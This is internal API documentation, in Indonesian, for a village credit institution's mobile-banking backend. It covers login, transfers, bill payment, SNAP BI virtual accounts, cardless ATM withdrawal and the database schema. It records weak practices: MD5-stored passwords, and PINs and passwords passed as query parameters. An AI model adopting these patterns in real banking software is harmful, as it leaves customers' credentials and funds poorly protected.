          <table style="margin-bottom:12px">
            <tr><th>Header</th><th>Format</th><th>Keterangan</th></tr>
            <tr><td><span class="inline-code">X-CLIENT-ID</span></td><td>Terenkripsi</td><td>Device ID nasabah</td></tr>
            <tr><td><span class="inline-code">X-TIMESTAMP</span></td><td>ISO 8601</td><td>Waktu request</td></tr>
            <tr><td><span class="inline-code">X-SIGNATURE</span></td><td>Base64 RSA-SHA256</td><td>Signature dengan private key app</td></tr>
          </table>
          <pre>// Respon sukses:
{
  "status": "00",
  "message": "Sukses",
  "token": "eyJhbGciOiJIUzI1NiJ9...",
  "signature": "base64_signature"
}</pre>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- iOS ACCESS -->
<section id="section-ios-access" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-user-plus" style="color:#3b82f6"></i><h3>iOS \u2013 Registrasi, Login, Logout</h3></div>
    <div class="card-body">
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/register</span>
          <span style="font-size:12px;color:#64748b;margin-left:auto">Daftarkan perangkat nasabah</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <div class="info-box info-blue"><i class="fas fa-info-circle"></i><span>Nasabah harus sudah ada di <span class="inline-code">gmob_nasabah</span> dengan status 'R' (Registered belum aktif). Saat registrasi, IMEI device disimpan dan status diubah ke 'A'.</span></div>
          <pre>// Request Headers:
Authorization: Bearer &lt;access_token&gt;
X-TIMESTAMP: 2025-01-01T10:00:00+07:00
X-SIGNATURE: &lt;hmac_sha512&gt;
X-CLIENT-ID: &lt;device_imei_encrypted&gt;

// Respon sukses:
{
  "status": "00",
  "message": "Sukses",
  "customer_id": "enc_noid",
  "customer_name": "Nama Nasabah",
  "customer_pin": "enc_pin",
  "account_list": "enc_[norek#nama#saldo#produk]",
  "bank_key": "enc_BPD_PREFIX&lt;&gt;BPD_HASHCODE",
  "bank_list": "kode1-nama1#kode2-nama2#...",
  "ppob_list": "TYPE;CODE;NAME;NOMINAL;ADMIN#..."
}</pre>
          <table><tr><th>Status</th><th>Keterangan</th></tr>
          <tr><td><span class="badge badge-green">00</span></td><td>Sukses \u2013 status berubah ke A</td></tr>
          <tr><td><span class="badge badge-red">10</span></td><td>Data tidak ditemukan / status bukan R</td></tr>
          <tr><td><span class="badge badge-red">68</span></td><td>Timeout</td></tr></table>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/login</span>
          <span style="font-size:12px;color:#64748b;margin-left:auto">Login nasabah</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Validasi: imei_code + username + pass_crypto dari gmob_nasabah
// Respon sukses:
{
  "status": "00",
  "message": "Sukses",
  "account_list": "enc_daftar_rekening",
  "bank_key": "enc_key",
  "bank_list": "...",
  "ppob_list": "..."
}</pre>
          <table><tr><th>Status</th><th>Keterangan</th></tr>
          <tr><td><span class="badge badge-green">00</span></td><td>Login berhasil</td></tr>
          <tr><td><span class="badge badge-red">21</span></td><td>Username/password salah</td></tr>
          <tr><td><span class="badge badge-red">43</span></td><td>Akun diblokir (status B)</td></tr></table>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/logout</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Update gmob_token: status = 'closed', end_time = CURRENT_TIMESTAMP
{ "status": "00", "message": "Logout berhasil." }</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/update-pass</span>
          <span style="font-size:12px;color:#64748b;margin-left:auto">Ganti password</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Query params (terenkripsi AES):
?pass_old=enc_old&amp;pass_new=enc_new
// Sukses: {"status":"00","message":"Sukses"}
// Gagal:  {"status":"01","message":"Kata sandi tidak sama."}</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/update-pin</span>
          <span style="font-size:12px;color:#64748b;margin-left:auto">Ganti PIN transaksi</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Query params (terenkripsi AES):
?pin_old=enc_old&amp;pin_new=enc_new
// Sukses: {"status":"00","message":"Sukses"}
// Gagal:  {"status":"01","message":"PIN tidak sama."}</pre>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- iOS TABUNGAN -->
<section id="section-ios-tabungan" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-piggy-bank" style="color:#10b981"></i><h3>iOS \u2013 Layanan Tabungan</h3></div>
    <div class="card-body">
      <div class="info-box info-blue"><i class="fas fa-info-circle"></i><span>Semua endpoint tabungan memerlukan middleware <strong>iosCheckAccess</strong>. Data yang dikembalikan dienkripsi AES-256-CBC.</span></div>
      <div class="endpoint" style="margin-top:16px">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/tabungan/account-list</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Mengambil semua rekening dari gmob_rekening berdasarkan noid
// Saldo diambil real-time dari gtb_folio (SUM credit-debit)
// Format data setelah dekripsi:
[norek#nama_nasabah#saldo#jenis_produk]
// Contoh: [01234567890#I KETUT WIRA#2500000#Tabungan]

// Status error: 84 = data tidak ada, 01 = tidak aktif</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/tabungan/transaction-history</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Request: account_no (enc), start_date, end_date
// Query ke gtb_folio JOIN gum_kdtrs
// Format respon: [tgl#debval#trans_no#amount#keterangan]</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/tabungan/mutasi-history</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Mengambil mutasi dari gak_mutasi / tabel dinamis gte_folio, gtf_folio, dll
// berdasarkan prefix nomor rekening (10/11=Takamas, 20=Sipura, dll)
// Respon terenkripsi AES</pre>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- iOS TRANSFER LPD -->
<section id="section-ios-transfer-lpd" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-exchange-alt" style="color:#7c3aed"></i><h3>iOS \u2013 Transfer Sesama Nasabah LPD</h3></div>
    <div class="card-body">
      <p style="font-size:13px;line-height:1.8;margin-bottom:16px">
        3 tahap: <strong>Check &rarr; Inquiry &rarr; Posting</strong>. Setiap tahap memvalidasi hash SHA-256.
      </p>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/transfer-lpd/check</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Request: account_to (enc nomor rekening tujuan)
// Respon: { "status":"00", "product_type":"Tabungan", "customer_name":"Nama" }
// Error: 01 = rekening tujuan tidak aktif</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/transfer-lpd/inquiry</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Hash formula: SHA-256(from+to+amount+namaDari+namaTujuan+remark+BPD_HASHCODE)
{
  "account_from": "enc_norek_asal",
  "account_to": "enc_norek_tujuan",
  "amount": "enc_nominal",
  "name_from": "enc_nama_pengirim",
  "name_to": "enc_nama_penerima",
  "remark": "enc_keterangan",
  "hash_code": "sha256_hash"
}
// Sukses: { "status":"00", "balance": 2500000 }
// Error: 62=hash salah, 01=tdk aktif, 04=saldo kurang, 25=min, 26=limit</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/transfer-lpd/post</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Tambahan field: ref_no (referensi unik), pin (enc)
// Proses: insert ke gmob_transfer, update folio &amp; mutasi
// Sukses: { "status":"00", "trans_no":"REF123", "amount":500000, "balance":2000000 }
// Error: 63=hash salah, 23=duplikat ref, 24=gagal proses</pre>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- iOS TRANSFER BANK -->
<section id="section-ios-transfer-bank" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-landmark" style="color:#3b82f6"></i><h3>iOS \u2013 Transfer ke Bank Lain via BPD</h3></div>
    <div class="card-body">
      <p style="font-size:13px;margin-bottom:16px">Transfer dari rekening LPD ke bank lain (BNI, BRI, Mandiri, dll) melalui jaringan BPD Bali. Biaya transfer dari tabel <span class="inline-code">gcore_bankcode</span>.</p>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/transfer-bank/check</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Request: bank_code, account_to (enc), hash_code
// Proses: request ke BPD Account Inquiry External
// Respon: { "status":"00", "account_name":"NAMA PENERIMA", "bank_name":"BNI" }</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/transfer-bank/inquiry</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Hash: SHA-256(from+bankCode+to+amount+BPD_HASHCODE)
// Respon: { "status":"00", "transfer_cost":6500, "balance":2500000 }
// Error: 51/52/53=hash salah, 40=saldo kurang</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/transfer-bank/post</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Alur: Debit folio LPD -&gt; Kirim ke BPD API -&gt; Catat gcore_transfer
// BPD response code sukses: 2001800
// Error: 45=duplikat ref, 68=BPD timeout</pre>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- iOS PPOB -->
<section id="section-ios-ppob" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-bolt" style="color:#d97706"></i><h3>iOS \u2013 PPOB (Pembayaran Tagihan &amp; Pulsa)</h3></div>
    <div class="card-body">
      <p style="font-size:13px;margin-bottom:16px">Gateway: <strong>FastPay (RajaBiller)</strong> dan <strong>IAK</strong>. Fee admin: <strong>Rp 2.000</strong>/transaksi.</p>
      <h4 style="font-weight:700;font-size:13px;margin-bottom:8px">Produk yang didukung:</h4>
      <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px">
        <span class="badge badge-blue">PLN Prabayar/Pascabayar</span>
        <span class="badge badge-blue">PDAM</span>
        <span class="badge badge-blue">BPJS Kesehatan</span>
        <span class="badge badge-blue">Telkom</span>
        <span class="badge badge-blue">Paket Internet</span>
        <span class="badge badge-blue">Pulsa (Prepaid)</span>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/ppob/check</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Request: account_no (enc), product_code, customer_id (enc)
// Endpoint FastPay: POST https://rajabiller.fastpay.co.id/transaksi/api_json.php
// Respon: { "status":"00", "tagihan":250000, "admin":2000, "customer_name":"NAMA" }
// Error: 04=saldo kurang, 05=deposit PPOB kurang, 26=limit harian</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/ppob/request</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Tambahan: nominal (enc), hash_code, pin (enc)
// Proses: validasi -&gt; create gmob_payment -&gt; call FastPay API -&gt; update folio
// Respon: { "status":"00", "tagihan":250000, "admin":2000, "remark":"PLN|ID|TOKEN" }</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/smart/iak/check &amp; /smart/iak/request</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// IAK API (idalamat.com):
// Prepaid: POST https://prepaid.iak.id/api/top-up
// Postpaid: POST https://mobilepulsa.net/api/v1/bill/check
// Signature IAK: MD5(username + apikey + ref_id)
// Respon format sama dengan /ppob/*</pre>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- SNAP -->
<section id="section-snap" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-plug" style="color:#3b82f6"></i><h3>SNAP BI \u2013 Transfer Masuk via VA BPD</h3></div>
    <div class="card-body">
      <p style="font-size:13px;margin-bottom:16px">Implementasi <strong>SNAP BI (Standar Nasional Open API Pembayaran)</strong> untuk menerima transfer dari bank lain menggunakan Virtual Account BPD. Prefix VA production: <span class="inline-code">989191</span>.</p>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/v1.0/access-token/b2b</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Headers: X-TIMESTAMP, X-CLIENT-KEY, X-SIGNATURE
// Body: { "grantType": "client_credentials" }
// Respon: {
//   "responseCode": "2002500",
//   "accessToken": "token_string",
//   "tokenType": "BearerToken",
//   "expiresIn": 900
// }</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/v1.0/transfer-va/inquiry</span>
          <span class="badge badge-yellow" style="margin-left:8px">Service Code 24</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Headers: Authorization: Bearer &lt;token&gt;, X-TIMESTAMP, X-SIGNATURE
// X-PARTNER-ID, X-EXTERNAL-ID
// HMAC-SHA512: POST:/v1.0/transfer-va/inquiry:token:sha256(body):timestamp

// Body:
{
  "partnerServiceId": "  989191",
  "customerNo": "012345678901234",
  "virtualAccountNo": "989191012345678901234",
  "inquiryRequestId": "unique-id",
  "amount": { "value": "500000.00", "currency": "IDR" },
  "additionalInfo": { "terminalType": "01", "terminalId": "ATM001" }
}

// Sukses (200): responseCode: "2002400"
// virtualAccountName: nama nasabah, inquiryStatus: "00"</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/v1.0/transfer-va/payment</span>
          <span class="badge badge-yellow" style="margin-left:8px">Service Code 25</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Proses: kredit nasabah di gtb_folio + gak_mutasi + gcore_transfer
// Body: paymentRequestId, paidAmount, sourceAccountNo, referenceNo
// Sukses (200): responseCode: "2002500", paymentFlagStatus: "00"</pre>
        </div>
      </div>
      <h4 style="font-weight:700;font-size:13px;margin-top:16px;margin-bottom:8px">Kode Respons SNAP:</h4>
      <table>
        <tr><th>Code</th><th>Arti</th></tr>
        <tr><td>2002400 / 2002500</td><td>Sukses inquiry / payment</td></tr>
        <tr><td>4002400</td><td>Missing mandatory field</td></tr>
        <tr><td>4012400</td><td>Invalid signature</td></tr>
        <tr><td>4012401</td><td>Invalid access token</td></tr>
        <tr><td>4032400</td><td>IP tidak dikenal</td></tr>
        <tr><td>4032415</td><td>Rekening tidak aktif</td></tr>
        <tr><td>4092401</td><td>Duplicate reference</td></tr>
      </table>
    </div>
  </div>
</section>

<!-- ATM -->
<section id="section-atm" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-credit-card" style="color:#ea580c"></i><h3>ATM Cardless \u2013 Setor &amp; Tarik Tanpa Kartu</h3></div>
    <div class="card-body">
      <div class="info-box info-yellow"><i class="fas fa-exclamation-triangle"></i>
        <span>Hash: <strong>SHA-256(ATM_HASHCODE + token + account_no + transaction_datetime)</strong>. IP harus ada di ATM_WHITE_LIST.</span>
      </div>
      <div class="endpoint" style="margin-top:16px">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/cardless/create-token</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Dari app mobile iOS, buat token 6 digit untuk digunakan di ATM
// Request: account_no, token, hash_code
// Proses: insert/update gmob_token status='open'
// Respon: { "status":"00", "data":"TOKEN6DIGIT" }</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/cardless/get-token</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Dari ATM, validasi token yang dimasukkan nasabah
// Request: token, transaction_code (01=tarik, 02=setor), hash_code
// Respon: { "status":"00", "account_no":"norek", "customer_name":"NAMA" }
// Error: 30=hash salah, 40=IP tidak dikenal</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/cardless/cash-debit</span>
          <span style="font-size:12px;color:#64748b;margin-left:auto">Tarik tunai</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Request: account_no, token, amount, transaction_datetime, hash_code
// Proses: kurangi saldo, update gtb_folio &amp; gak_mutasi
// Respon: { "responseCode":"00", "balance":2000000 }
// Error: 61=saldo kurang, 14=rekening tidak aktif</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/cardless/cash-credit</span>
          <span style="font-size:12px;color:#64748b;margin-left:auto">Setor tunai</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Proses: tambah saldo, update gtb_folio &amp; gak_mutasi
// Respon: { "responseCode":"00", "balance":3000000 }</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/cardless/reversal-debit &amp; /reversal-credit</span>
          <span style="font-size:12px;color:#64748b;margin-left:auto">Batal transaksi</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Hapus record folio &amp; mutasi yang sudah diproses
// Request: account_no, token, trans_no, hash_code
// Respon: { "responseCode": "00" }</pre>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- PPOB CALLBACK -->
<section id="section-ppob-callback" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-reply" style="color:#64748b"></i><h3>PPOB Callback</h3></div>
    <div class="card-body">
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span><span class="endpoint-path">/ppob/callback</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Menerima callback dari FastPay / provider PPOB
// Selalu mengembalikan:
{ "status": "99", "rc": "&lt;rc_dari_provider&gt;" }</pre>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- DATABASE -->
<section id="section-database" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-database" style="color:#3b82f6"></i><h3>Skema Database SQL Server: Giosoft_LPD</h3></div>
    <div class="card-body">
      <div class="info-box info-yellow"><i class="fas fa-exclamation-triangle"></i>
        <span>Beberapa query lintas database: <span class="inline-code">Giosoft_Dev.dbo.gtb_folio</span></span>
      </div>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:16px">
        <div class="db-table">
          <div class="db-table-header">gmob_nasabah</div>
          <div class="db-table-body">
            <div class="db-col"><span class="db-col-name">noid</span><span class="db-col-type">varchar PK</span><span class="db-col-desc">ID unik nasabah</span></div>
            <div class="db-col"><span class="db-col-name">nama</span><span class="db-col-type">varchar</span><span class="db-col-desc">Nama nasabah</span></div>
            <div class="db-col"><span class="db-col-name">norek</span><span class="db-col-type">varchar</span><span class="db-col-desc">Nomor rekening utama</span></div>
            <div class="db-col"><span class="db-col-name">username</span><span class="db-col-type">varchar</span><span class="db-col-desc">Username login</span></div>
            <div class="db-col"><span class="db-col-name">pass_crypto</span><span class="db-col-type">varchar</span><span class="db-col-desc">Password (md5)</span></div>
            <div class="db-col"><span class="db-col-name">pin_crypto</span><span class="db-col-type">varchar</span><span class="db-col-desc">PIN transaksi</span></div>
            <div class="db-col"><span class="db-col-name">imei_code</span><span class="db-col-type">varchar</span><span class="db-col-desc">IMEI / device ID</span></div>
            <div class="db-col"><span class="db-col-name">status</span><span class="db-col-type">char(1)</span><span class="db-col-desc">R=Register A=Aktif B=Blokir</span></div>
            <div class="db-col"><span class="db-col-name">aes_key</span><span class="db-col-type">varchar</span><span class="db-col-desc">Kunci AES-256 per perangkat</span></div>
            <div class="db-col"><span class="db-col-name">aes_iv</span><span class="db-col-type">varchar</span><span class="db-col-desc">IV AES</span></div>
            <div class="db-col"><span class="db-col-name">max_transfer</span><span class="db-col-type">bigint</span><span class="db-col-desc">Limit transfer harian</span></div>
            <div class="db-col"><span class="db-col-name">scramble_code</span><span class="db-col-type">varchar</span><span class="db-col-desc">Kode scramble enkripsi</span></div>
            <div class="db-col"><span class="db-col-name">version</span><span class="db-col-type">varchar</span><span class="db-col-desc">Versi app iOS nasabah</span></div>
          </div>
        </div>
        <div class="db-table">
          <div class="db-table-header">gmob_token</div>
          <div class="db-table-body">
            <div class="db-col"><span class="db-col-name">id</span><span class="db-col-type">int PK</span><span class="db-col-desc">Auto increment</span></div>
            <div class="db-col"><span class="db-col-name">account_no</span><span class="db-col-type">varchar</span><span class="db-col-desc">IMEI / noid nasabah</span></div>
            <div class="db-col"><span class="db-col-name">token</span><span class="db-col-type">varchar</span><span class="db-col-desc">Token string</span></div>
            <div class="db-col"><span class="db-col-name">date_time</span><span class="db-col-type">datetime</span><span class="db-col-desc">Waktu pembuatan</span></div>
            <div class="db-col"><span class="db-col-name">status</span><span class="db-col-type">varchar</span><span class="db-col-desc">open/closed</span></div>
            <div class="db-col"><span class="db-col-name">end_time</span><span class="db-col-type">datetime</span><span class="db-col-desc">Waktu logout</span></div>
          </div>
        </div>
        <div class="db-table">
          <div class="db-table-header">gtb_folio</div>
          <div class="db-table-body">
            <div class="db-col"><span class="db-col-name">linker</span><span class="db-col-type">varchar</span><span class="db-col-desc">Nomor rekening</span></div>
            <div class="db-col"><span class="db-col-name">mutasi_date</span><span class="db-col-type">date</span><span class="db-col-desc">Tanggal audit</span></div>
            <div class="db-col"><span class="db-col-name">trans_date</span><span class="db-col-type">datetime</span><span class="db-col-desc">Tanggal transaksi</span></div>
            <div class="db-col"><span class="db-col-name">debit</span><span class="db-col-type">decimal</span><span class="db-col-desc">Jumlah debit</span></div>
            <div class="db-col"><span class="db-col-name">credit</span><span class="db-col-type">decimal</span><span class="db-col-desc">Jumlah kredit</span></div>
            <div class="db-col"><span class="db-col-name">saldo</span><span class="db-col-type">decimal</span><span class="db-col-desc">Saldo setelah transaksi</span></div>
            <div class="db-col"><span class="db-col-name">trans_no</span><span class="db-col-type">varchar</span><span class="db-col-desc">Nomor referensi</span></div>
            <div class="db-col"><span class="db-col-name">remark</span><span class="db-col-type">varchar</span><span class="db-col-desc">Keterangan (max 50)</span></div>
            <div class="db-col"><span class="db-col-name">debit_val</span><span class="db-col-type">char(1)</span><span class="db-col-desc">T=debit F=kredit</span></div>
          </div>
        </div>
        <div class="db-table">
          <div class="db-table-header">gcore_transfer</div>
          <div class="db-table-body">
            <div class="db-col"><span class="db-col-name">transfer_code</span><span class="db-col-type">varchar PK</span><span class="db-col-desc">Kode unik transfer</span></div>
            <div class="db-col"><span class="db-col-name">transfer_type</span><span class="db-col-type">varchar</span><span class="db-col-desc">IN/OUT</span></div>
            <div class="db-col"><span class="db-col-name">norek</span><span class="db-col-type">varchar</span><span class="db-col-desc">Rekening LPD</span></div>
            <div class="db-col"><span class="db-col-name">amount</span><span class="db-col-type">decimal</span><span class="db-col-desc">Nominal</span></div>
            <div class="db-col"><span class="db-col-name">referenceNumber</span><span class="db-col-type">varchar</span><span class="db-col-desc">Nomor referensi BPD</span></div>
            <div class="db-col"><span class="db-col-name">responseCode</span><span class="db-col-type">varchar</span><span class="db-col-desc">Kode respons</span></div>
            <div class="db-col"><span class="db-col-name">destinationBankCode</span><span class="db-col-type">varchar</span><span class="db-col-desc">Kode bank tujuan</span></div>
          </div>
        </div>
      </div>
      <h4 style="font-weight:700;margin:16px 0 8px;font-size:14px">Tabel Pendukung Lainnya:</h4>
      <table>
        <tr><th>Tabel</th><th>Fungsi</th></tr>
        <tr><td><span class="inline-code">gmob_transfer</span></td><td>Transfer sesama LPD (AR)</td></tr>
        <tr><td><span class="inline-code">gmob_payment</span></td><td>Transaksi PPOB</td></tr>
        <tr><td><span class="inline-code">gmob_rekening</span></td><td>Daftar rekening per nasabah</td></tr>
        <tr><td><span class="inline-code">gmob_responcode</span></td><td>Master kode dan pesan respons</td></tr>
        <tr><td><span class="inline-code">gmob_counter</span></td><td>Counter nomor referensi per periode</td></tr>
        <tr><td><span class="inline-code">gum_config</span></td><td>Tanggal audit + limit transfer global</td></tr>
        <tr><td><span class="inline-code">gak_mutasi</span></td><td>Mutasi GL akuntansi</td></tr>
        <tr><td><span class="inline-code">gak_bookstatus</span></td><td>Status buka/tutup buku harian</td></tr>
        <tr><td><span class="inline-code">gcore_bankcode</span></td><td>Kode bank + biaya transfer</td></tr>
        <tr><td><span class="inline-code">gcore_log</span></td><td>Log detail transaksi VA</td></tr>
        <tr><td><span class="inline-code">gppob_produk</span></td><td>Master produk PPOB</td></tr>
        <tr><td><span class="inline-code">gtb_nasabah</span></td><td>Data nasabah tabungan core</td></tr>
        <tr><td><span class="inline-code">gkr_debitor</span></td><td>Data debitur (pinjaman)</td></tr>
        <tr><td><span class="inline-code">gdp_deposan</span></td><td>Data deposito</td></tr>
      </table>
    </div>
  </div>
</section>

<!-- RESPONSE CODES -->
<section id="section-response-codes" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-list-ol" style="color:#3b82f6"></i><h3>Daftar Kode Respons Sistem</h3></div>
    <div class="card-body">
      <div class="grid-2">
        <div>
          <h4 style="font-weight:700;margin-bottom:8px;font-size:13px">iOS mBanking:</h4>
          <table>
            <tr><th>Kode</th><th>Arti</th></tr>
            <tr><td><span class="badge badge-green">00</span></td><td>Sukses</td></tr>
            <tr><td><span class="badge badge-red">01</span></td><td>Rekening tidak aktif</td></tr>
            <tr><td><span class="badge badge-red">04</span></td><td>Saldo tidak cukup</td></tr>
            <tr><td><span class="badge badge-red">05</span></td><td>Deposit PPOB kurang</td></tr>
            <tr><td><span class="badge badge-red">10</span></td><td>Data tidak ditemukan</td></tr>
            <tr><td><span class="badge badge-red">21</span></td><td>Username/password salah</td></tr>
            <tr><td><span class="badge badge-red">23</span></td><td>Referensi duplikat</td></tr>
            <tr><td><span class="badge badge-red">24</span></td><td>Gagal memproses</td></tr>
            <tr><td><span class="badge badge-red">25</span></td><td>Nominal di bawah minimum</td></tr>
            <tr><td><span class="badge badge-red">26</span></td><td>Melebihi limit harian</td></tr>
            <tr><td><span class="badge badge-red">43</span></td><td>Akun diblokir</td></tr>
            <tr><td><span class="badge badge-red">51/52/53</span></td><td>Hash mismatch (check/inquiry/post)</td></tr>
            <tr><td><span class="badge badge-red">54</span></td><td>PIN salah</td></tr>
            <tr><td><span class="badge badge-red">62/63</span></td><td>Hash LPD (inquiry/posting)</td></tr>
            <tr><td><span class="badge badge-red">68</span></td><td>Timeout / error internal</td></tr>
            <tr><td><span class="badge badge-red">84</span></td><td>Data tidak ditemukan</td></tr>
          </table>
        </div>
        <div>
